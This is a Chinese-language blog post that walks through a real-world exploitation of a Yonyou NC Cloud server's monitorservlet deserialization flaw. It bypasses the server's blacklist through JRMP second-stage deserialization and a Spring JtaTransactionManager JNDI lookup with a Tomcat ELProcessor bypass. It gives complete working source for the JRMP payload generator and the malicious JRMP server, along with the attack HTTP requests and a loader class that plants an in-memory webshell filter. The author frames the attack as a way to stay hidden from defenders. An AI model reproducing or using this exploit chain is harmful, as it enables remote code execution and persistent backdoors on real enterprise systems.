---
title: 用友Monitorservlet黑名单下的JRMP二次反序列化
slug: nccloud-blacklist-jrmp-second-deser
description: ""
date: 2026-09-23T23:02:17+08:00
lastmod: 2026-09-23T23:02:17+08:00
author: baozongwi
categories:
  - Offensive
tags:
  - Java反序列化
  - 二次反序列化
  - JRMP
  - JNDI
  - NC Cloud
---
## TL;DR

用友的站貌似都是宝藏站🤣

NC Cloud 2111，Windows，JDK 8u202，Tomcat，`/servlet/monitorservlet` 反序列化。

公开 POC 是 CC6，这台有黑名单打不通。不出网 gadget 挖掘失败，测试出网之后用 JRMPClient 打 JRMPListener，二次反序列化走 `JtaTransactionManager` 的 JNDI，Tomcat Bypass（BeanFactory + ELProcessor）挂马。

## 实网测试

登录页 js 头上是 `@ncctag date=2021-11-20`，对得上 NC Cloud 2111。

![](assets/001.png)

报错栈里有 `org.apache.catalina.security.SecurityUtil`，还有 `Method.java:498`。Windows，JDK 8，Tomcat。

公开打法是这个口：

> https://blog.csdn.net/qq_41904294/article/details/135046126
>
> https://github.com/wgpsec/YongYouNcTool
>
> https://xz.aliyun.com/news/14968

按文章打了一发 CC6。

```text
java -jar ysoserial-all.jar CommonsCollections6 "whoami" > cc6.ser
```

```http
POST /servlet/monitorservlet HTTP/1.1
Host: x.x.x.x:8898
Content-Type: application/octet-stream

<cc6.ser>
```

```http
HTTP/1.1 200 OK
Content-Length: 36
```

命令没有跑。换一个空 HashMap。

```http
POST /servlet/monitorservlet HTTP/1.1
Host: x.x.x.x:8898
Content-Type: application/octet-stream

<empty HashMap>
```

```http
HTTP/1.1 200 OK
Content-Length: 4

aced 0005
```

HashMap，才会回这 4 字节，换成别的，回 37 字节，对象没读完。

### 黑名单

按照同样的思路把 classpath 拉出来，`InvokerTransformer`、`LazyMap`、`BeanComparator`、`TemplatesImpl`、`java.net.URL` 都没了。commons-collections 3 的 `TiedMapEntry` 不在，但是 collections4 的 `TiedMapEntry` 是 4。

`JdbcRowSetImpl` 空实例是 4 字节。但是 8U202 的 `readObject` 只把字段填回来，不能触发 lookup。

`BadAttributeValueExpException` 也是 4 字节，目标带着 SecurityManager，它的 `readObject` 无法触发 `toString`。

CC6 的后半截是 collections 3 的 `LazyMap`、`InvokerTransformer`没了，前半截还在，HashMap 读进来会给每个 key 算哈希。key 用 collections4 的 `TiedMapEntry` 时，源码会走到 `map.get`。

```java
    public Object getValue() {
        return map.get(key);
    }

    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
            (value == null ? 0 : value.hashCode());
    }
```

如果把这个 map 换成一个 `get` 会失败的对象再 POST，回包从 4 字节变成 36 字节。空 HashMap 是 4 字节，所以多出来的失败出在 `hashCode` 里的这次 `get`，能接在 `get` 后面、又能序列化出去的 Map，没找到。

到这，由于我并不想打出网的，避免蓝队发现我，所以我就测试了很久，去挖不出网的 gadget，结果没挖出来。

### 出网

先把 1389 开起来。`JdbcRowSetImpl` 里写上 LDAP 地址再 POST，回 4 字节，1389 没有查询。和前面看的 `readObject` 对得上。

后来想到 JRMP 反序列化，1199 是这次用的 RMI 端口。平时只有打 Shiro 才碰一下 JRMP，这里把 debug 通信流程和必要原理记一下。

POST 的仍是 HashMap，`TiedMapEntry` 的 map 换成远程引用，里面写我们的地址和 1199。目标连过来之后，先调用的 objNum 是 2，这是 RMI 自己的 DGC，用来登记这个远程引用，不是 `Map.get`，随后监听把 CC6 放进 DGC 的回包。HTTP 是 4 字节，但是命令没执行。本地用 JDK 8u201 测试，对象放进 DGC 回包会被拒绝，异常是 `InvalidClassException: filter status: REJECTED`。

这会儿监听上只有 DGC，没有 `get`。代理没有实现 `Remote`。本地一调 `get`，直接抛 `proxy not Remote instance`，调用出不去。

用 Map 做一层代理再加 Remote，重新 POST，1199 上出现 `Map.get`，method 是 -1，回包从 `UnicastRef.unmarshalValue` 再次触发 readObject，完整的 JRMP 二次反序列化链就出来了。

```
HashMap.readObject
  HashMap.hash
    TiedMapEntry.hashCode
      TiedMapEntry.getValue
        map.get
          RemoteObjectInvocationHandler.invoke
            UnicastRef.invoke
              UnicastRef.unmarshalValue
                readObject
```

二次反序列化可以绕过 servlet 检查。CC4 的 `LazyMap`、`java.net.URL` 在 servlet 上是 36 字节，放在 `Map.get` 的回包里是 4 字节。但是`TemplatesImpl`、`BeanComparator`、CC3 的 `InvokerTransformer` 在回包里仍是 36，既然字节码不能用，就考虑打 JNDI、jdbc，这里没探测到数据库驱动，所以找一个合适的类来触发 lookup，https://baozongwi.xyz/p/hitctf-2025-ezloader/ Spring 的 `JtaTransactionManager` 是 4 字节，序列化版本也对得上。跟进其 `readObject`，

```java
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        this.jndiTemplate = new JndiTemplate();
        initUserTransactionAndTransactionManager();
        initTransactionSynchronizationRegistry();
    }

    protected UserTransaction lookupUserTransaction(String userTransactionName)
            throws TransactionSystemException {
        try {
            if (logger.isDebugEnabled()) {
                logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
            }
            return getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
        }
        catch (NamingException ex) {
            throw new TransactionSystemException(
                    "JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", ex);
        }
    }
```

https://baozongwi.xyz/p/jndi-injection-bypass-high-version-jdk/ 8u202 不能按 codebase 去加载远程 class，用友是 Tomcat 自带 `BeanFactory`，可以让 `ELProcessor` 去 `eval`，也就是 Tomcat Bypass。服务器启动了 JNDIMap，`userTransactionName` 先填 `ldap://x.x.x.x:1389/TomcatBypass/Command/whoami`，收到了查询。

但是挂马的时候，使用 JNDIMap 默认的 FromFile 时，加载出来的是匿名类，不在这个网站的 ClassLoader 上。所以我们需要自己写一个类，`JxFilter` 改到当前线程的 ClassLoader 上 `defineClass`，再 `new`，构造方法里注册 Filter。

最后查找的地址换成 `ldap://x.x.x.x:1389/TomcatBypass/FromFile/JxFilter.class`。

### poc

JRMP Client

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public class G15 {
  static void setField(Object o, String name, Object v) throws Exception {
    Field f = null;
    for (Class<?> c = o.getClass(); c != null; c = c.getSuperclass()) {
      try {
        f = c.getDeclaredField(name);
        break;
      } catch (NoSuchFieldException ignored) {}
    }
    f.setAccessible(true);
    f.set(o, v);
  }

  public static void main(String[] args) throws Exception {
    String host = args[0];
    int port = Integer.parseInt(args[1]);
    ObjID id = new ObjID(new Random().nextInt());
    UnicastRef ref = new UnicastRef(new LiveRef(id, new TCPEndpoint(host, port), false));
    Object map = Proxy.newProxyInstance(G15.class.getClassLoader(),
        new Class<?>[] { Map.class, Remote.class },
        new RemoteObjectInvocationHandler(ref));
    TiedMapEntry tme = new TiedMapEntry(new HashMap<Object, Object>(), "foo");
    HashMap<Object, Object> root = new HashMap<Object, Object>();
    root.put(tme, "v");
    setField(tme, "map", map);
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(args[2]));
    oos.writeObject(root);
    oos.close();
  }
}
// java -cp .:commons-collections4-4.4.jar G15 x.x.x.x 1199 g15_tme_map_1199.ser
```

JRMP Server

```java
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.server.ObjID;
import java.rmi.server.UID;

public class JrmpCB_final {
  static final int MAGIC = 0x4a524d49;
  static final short VERSION = 2;
  static final byte STREAM_PROTOCOL = 0x4b;
  static final byte SINGLEOP_PROTOCOL = 0x4c;
  static final byte PROTOCOL_ACK = 0x4e;
  static final byte CALL = 0x50;
  static final byte RETURN = 0x51;
  static final byte PING = 0x52;
  static final byte PING_ACK = 0x53;
  static Object payload;
  static final byte NORMAL_RETURN = 0x01;
  static final byte EXCEPTIONAL_RETURN = 0x02;

  static class AnnotatingOOS extends ObjectOutputStream {
    AnnotatingOOS(OutputStream out) throws IOException { super(out); }
    protected void annotateClass(Class<?> cl) throws IOException { writeObject(null); }
    protected void annotateProxyClass(Class<?> cl) throws IOException { annotateClass(cl); }
  }

  static Object makeJta(String jndi) throws Exception {
    Object jta = Class.forName("org.springframework.transaction.jta.JtaTransactionManager").newInstance();
    jta.getClass().getMethod("setUserTransactionName", String.class).invoke(jta, jndi);
    try {
      jta.getClass().getMethod("setAllowCustomIsolationLevels", boolean.class).invoke(jta, Boolean.TRUE);
    } catch (Exception ignored) {}
    return jta;
  }

  static void doCall(DataInputStream in, DataOutputStream out) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(in) {
      protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String n = desc.getName();
        if ("[Ljava.rmi.server.ObjID;".equals(n)) return ObjID[].class;
        if ("java.rmi.server.ObjID".equals(n)) return ObjID.class;
        if ("java.rmi.server.UID".equals(n)) return UID.class;
        throw new IOException("blocked " + n);
      }
    };
    ObjID read;
    try {
      read = ObjID.read(ois);
    } catch (IOException e) {
      System.err.println("unable to read objID: " + e);
      return;
    }
    boolean dgc = read.hashCode() == 2;
    if (dgc) {
      ois.readInt();
      ois.readLong();
      try { ois.readObject(); } catch (Exception e) { System.err.println("DGC args: " + e); }
    } else {
      try {
        int method = ois.readInt();
        long hash = ois.readLong();
        System.err.println("APP call method=" + method + " hash=" + hash);
      } catch (Exception e) {
        System.err.println("APP extra: " + e);
      }
    }
    out.writeByte(RETURN);
    ObjectOutputStream oos = new AnnotatingOOS(out);
    if (dgc) {
      oos.writeByte(EXCEPTIONAL_RETURN);
      new UID().write(oos);
      oos.writeObject(new RuntimeException("dgc"));
    } else {
      System.err.println("Sending APP payload class=" + payload.getClass().getName());
      oos.writeByte(NORMAL_RETURN);
      new UID().write(oos);
      oos.writeObject(payload);
    }
    oos.flush();
    out.flush();
    try { Thread.sleep(200); } catch (Exception e) {}
  }

  public static void main(String[] args) throws Exception {
    int port = Integer.parseInt(args[0]);
    String jndi = args.length > 1
        ? args[1]
        : "ldap://x.x.x.x:1389/TomcatBypass/FromFile/JxFilter.class";
    payload = makeJta(jndi);
    System.err.println("* JRMP JtaTransactionManager " + jndi + " port=" + port);
    ServerSocket ss = new ServerSocket(port);
    while (true) {
      Socket s = ss.accept();
      try {
        s.setSoTimeout(15000);
        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
        System.err.println("Have connection from " + remote);
        DataInputStream in = new DataInputStream(new BufferedInputStream(s.getInputStream()));
        int magic = in.readInt();
        short ver = in.readShort();
        if (magic != MAGIC || ver != VERSION) {
          System.err.println("bad magic/ver");
          s.close();
          continue;
        }
        DataOutputStream out = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
        byte proto = in.readByte();
        if (proto == STREAM_PROTOCOL) {
          out.writeByte(PROTOCOL_ACK);
          out.writeUTF(remote.getAddress().getHostAddress());
          out.writeInt(remote.getPort());
          out.flush();
          in.readUTF();
          in.readInt();
        }
        if (proto == STREAM_PROTOCOL || proto == SINGLEOP_PROTOCOL) {
          int op = in.read();
          if (op == CALL) doCall(in, out);
          else if (op == PING) { out.writeByte(PING_ACK); out.flush(); }
        }
        out.flush();
      } catch (Exception e) {
        e.printStackTrace(System.err);
      } finally {
        try { s.close(); } catch (Exception e) {}
        System.err.println("Closing connection");
      }
    }
  }
}
// java -cp .:spring-tx.jar:spring-beans.jar:spring-core.jar:commons-logging.jar JrmpCB_final 1199 ldap://x.x.x.x:1389/TomcatBypass/FromFile/JxFilter.class
```

### 内存马

JRMP Server 和 JNDIMap 先开着。body 是 JRMP Client 生成的 ser，Filter 就挂上了。

```http
POST /servlet/monitorservlet HTTP/1.1
Host: x.x.x.x:8898
Content-Type: application/octet-stream
Content-Length: 496

<g15_tme_map_1199.ser>
```

这一发打出去以后，网站自己会连到 1199。我们的 JRMP Server 接到这次连接，再把一份命令执行、挂马序列化数据发回去，网站再反序列化，挂马成功。

```http
GET / HTTP/1.1
Host: x.x.x.x:8898
User-Agent: Mozilla/5.0 <HEADER_TOKEN>
```

```http
HTTP/1.1 200 OK
Set-Cookie: <COOKIE_NAME>=<COOKIE_VALUE>
Content-Length: 0
```

字节码放在构造方法里，当前线程的 ClassLoader 就是用友的。

JxFilter

```java
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import sun.misc.Unsafe;

public class JxFilter {
  static final String B64 = "<INJECTOR_CLASS_BASE64>";

  public JxFilter() throws Exception {
    byte[] bt = java.util.Base64.getDecoder().decode(B64);
    ClassLoader cl = Thread.currentThread().getContextClassLoader();
    if (cl == null) {
      cl = ClassLoader.getSystemClassLoader();
    }
    String name = "<INJECTOR_CLASS_NAME>";
    Class c = null;
    try {
      Field uf = Unsafe.class.getDeclaredField("theUnsafe");
      uf.setAccessible(true);
      Unsafe u = (Unsafe) uf.get(null);
      Method dc = Unsafe.class.getMethod(
          "defineClass",
          String.class, byte[].class, int.class, int.class,
          ClassLoader.class, java.security.ProtectionDomain.class);
      java.security.ProtectionDomain pd = cl.getClass().getProtectionDomain();
      c = (Class) dc.invoke(u, new Object[] {
          name, bt, Integer.valueOf(0), Integer.valueOf(bt.length), cl, pd
      });
    } catch (Throwable t1) {
      Method m = ClassLoader.class.getDeclaredMethod(
          "defineClass", String.class, byte[].class, int.class, int.class);
      m.setAccessible(true);
      c = (Class) m.invoke(cl, new Object[] {
          name, bt, Integer.valueOf(0), Integer.valueOf(bt.length)
      });
    }
    c.newInstance();
  }
}
// javac JxFilter.java
```

